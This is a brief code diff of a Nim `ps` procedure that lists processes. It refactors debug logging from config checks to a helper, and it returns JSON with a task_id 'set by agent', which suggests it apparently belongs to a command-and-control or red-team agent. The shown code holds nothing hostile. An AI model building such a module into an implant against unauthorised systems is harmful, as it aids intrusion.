@@ -1,5 +1,5 @@
-import ../config
 import std/[json, strformat, os, strutils]
+import ../utils/debug
 
 type
   ProcessEntry = object
@@ -176,10 +176,7 @@ when not defined(windows):
           continue
 
 proc ps*(params: string): JsonNode =
-  let cfg = getConfig()
-  
-  if cfg.debug:
-    echo "[DEBUG] Getting process list"
+  debug "[DEBUG] Getting process list"
   
   try:
     when defined(windows):
@@ -208,8 +205,7 @@ proc ps*(params: string): JsonNode =
       "processes": processesJson
     }
     
-    if cfg.debug:
-      echo &"[DEBUG] Found {processes.len} processes"
+    debug &"[DEBUG] Found {processes.len} processes"
     
     return %*{
       "task_id": "",  # Will be set by agent
